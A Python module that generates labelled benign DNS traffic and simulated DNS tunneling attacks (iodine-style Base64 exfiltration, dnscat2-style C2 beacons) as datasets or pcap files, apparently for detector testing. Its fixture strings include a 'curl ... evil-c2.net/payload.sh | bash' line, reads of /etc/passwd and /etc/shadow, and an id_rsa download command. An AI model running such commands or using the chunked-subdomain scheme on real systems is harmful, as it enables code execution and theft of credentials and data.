"""
Realistic DNS Traffic Generator & Tunneling Attack Simulator.
Generates genuine Benign network lookups as well as simulated DNS Tunneling attacks
(Iodine-style data exfiltration and dnscat2-style interactive C2 beacons).
Outputs to Python datasets or Scapy-compatible .pcap files.
"""

import base64
import time
import random
from scapy.all import IP, UDP, wrpcap
from scapy.layers.dns import DNS, DNSQR

class DNSTrafficSimulator:
    """
    Simulates benign DNS lookups and advanced DNS tunneling attack patterns.
    """
    
    BENIGN_DOMAINS = [
        ("google.com", "A"),
        ("mail.google.com", "A"),
        ("api.github.com", "A"),
        ("raw.githubusercontent.com", "A"),
        ("en.wikipedia.org", "A"),
        ("aws.amazon.com", "A"),
        ("login.microsoftonline.com", "A"),
        ("cdn.cloudflare.com", "A"),
        ("e1029.g.akamaiedge.net", "CNAME"),
        ("netflix.com", "A"),
        ("google.com", "TXT"),  # Standard SPF record
        ("slack.com", "A"),
        ("news.ycombinator.com", "A"),
        ("static.xx.fbcdn.net", "A"),
        ("dns.google", "A"),
        ("zoom.us", "A"),
        ("chat.openai.com", "A"),
        ("fonts.googleapis.com", "A"),
        ("smtp.office365.com", "MX"),
        ("auth.okta.com", "A"),
        ("docker.com", "A")
    ]

    SECRET_DATA_LEAKS = [
        "CONFIDENTIAL_DB_EXPORT: user=sysadmin; password_hash=5f4dcc3b5aa765d61d8327deb882cf99; role=superuser; access=full_prod_db",
        "PCI_DSS_VIOLATION: cardholder=JohnDoe; pan=4532-0158-9843-1120; exp=12/28; cvv=849; billing_zip=94107",
        "COMPANY_SECRETS: ProjectTitan_Source_Repository_Key=ghp_98410293847192837192837129837; Internal_IP=10.240.0.14",
        "BASH_HISTORY_EXFIL: curl -s https://evil-c2.net/payload.sh | bash; cat /etc/passwd; tar -czf backup.tar.gz /var/www"
    ]

    @classmethod
    def generate_benign_traffic(cls, count: int = 50, client_ip: str = "192.168.1.105") -> list:
        """
        Generates simulated everyday enterprise DNS queries.
        """
        records = []
        base_time = time.time() - (count * 2)
        
        for i in range(count):
            domain, qtype = random.choice(cls.BENIGN_DOMAINS)
            # Add occasional variation in subdomain
            if random.random() < 0.20 and not domain.startswith("e1029"):
                domain = f"node-{random.randint(1, 99)}.{domain}"
                
            q_time = base_time + (i * random.uniform(1.2, 3.5))
            records.append({
                "timestamp": q_time,
                "client_ip": client_ip,
                "server_ip": "8.8.8.8",
                "query_name": domain,
                "qtype": qtype,
                "label": "benign"
            })
        return records

    @classmethod
    def generate_tunneling_attack(cls, 
                                  attack_type: str = "iodine_exfiltration", 
                                  client_ip: str = "192.168.1.189", 
                                  c2_domain: str = "darknet-tunnel.org", 
                                  record_count: int = 40) -> list:
        """
        Generates simulated DNS tunneling attacks.
        attack_type: 'iodine_exfiltration' or 'dnscat2_c2'
        """
        records = []
        base_time = time.time() - (record_count * 1)

        if attack_type == "iodine_exfiltration":
            # Exfiltrate sensitive secrets broken into Base64 / Hex chunks
            secret_string = random.choice(cls.SECRET_DATA_LEAKS)
            # Encode to base64
            b64_data = base64.b64encode(secret_string.encode('utf-8')).decode('utf-8')
            # Pad secret to generate plenty of chunks if needed
            while len(b64_data) < record_count * 25:
                b64_data += base64.b64encode(random.choice(cls.SECRET_DATA_LEAKS).encode('utf-8')).decode('utf-8')
            
            chunk_size = 28
            chunks = [b64_data[i:i+chunk_size] for i in range(0, len(b64_data), chunk_size)][:record_count]

            for idx, chunk in enumerate(chunks):
                # Format: b64-<chunk>.seq<idx>.data.<c2_domain>
                # High entropy, multi-label, TXT or A record
                qname = f"b64-{chunk}.seq{idx:03d}.data.{c2_domain}"
                qtype = random.choice(["TXT", "A", "TXT", "CNAME"])
                q_time = base_time + (idx * random.uniform(0.3, 0.9)) # High burst frequency
                
                records.append({
                    "timestamp": q_time,
                    "client_ip": client_ip,
                    "server_ip": "185.220.101.5",
                    "query_name": qname,
                    "qtype": qtype,
                    "label": "tunneling"
                })

        else: # dnscat2_c2 interactive beaconing
            session_id = f"{random.randint(1000, 9999):04x}"
            c2_commands = [
                "ping-heartbeat-alive",
                "cmd-exec-whoami",
                "cmd-exec-id-uid-0-root",
                "cmd-download-key-id-rsa",
                "cmd-exec-cat-etc-shadow",
                "poll-pending-instructions",
                "session-keepalive-ack"
            ]

            for idx in range(record_count):
                cmd = random.choice(c2_commands)
                encoded_cmd = cmd.encode('utf-8').hex()
                # dnscat format: dnscat.<session>.<hex_payload>.<c2_domain>
                qname = f"dnscat.{session_id}.{encoded_cmd}.tunnel.{c2_domain}"
                qtype = "TXT" if idx % 2 == 0 else "NULL"
                q_time = base_time + (idx * random.uniform(0.5, 1.8))
                
                records.append({
                    "timestamp": q_time,
                    "client_ip": client_ip,
                    "server_ip": "194.26.29.11",
                    "query_name": qname,
                    "qtype": qtype,
                    "label": "tunneling"
                })

        return records

    @classmethod
    def export_to_pcap(cls, records: list, output_pcap_path: str):
        """
        Converts query records to a real Wireshark-compatible .pcap file using Scapy.
        """
        packets = []
        type_map = {"A": 1, "NS": 2, "CNAME": 5, "NULL": 10, "MX": 15, "TXT": 16, "AAAA": 28}

        for rec in records:
            src = rec["client_ip"]
            dst = rec.get("server_ip", "8.8.8.8")
            qname = rec["query_name"] + "."
            qtype = type_map.get(rec["qtype"], 1)

            pkt = IP(src=src, dst=dst) / UDP(sport=random.randint(49152, 65535), dport=53) / DNS(
                rd=1,
                qd=DNSQR(qname=qname, qtype=qtype)
            )
            pkt.time = rec["timestamp"]
            packets.append(pkt)

        wrpcap(output_pcap_path, packets)
        return output_pcap_path
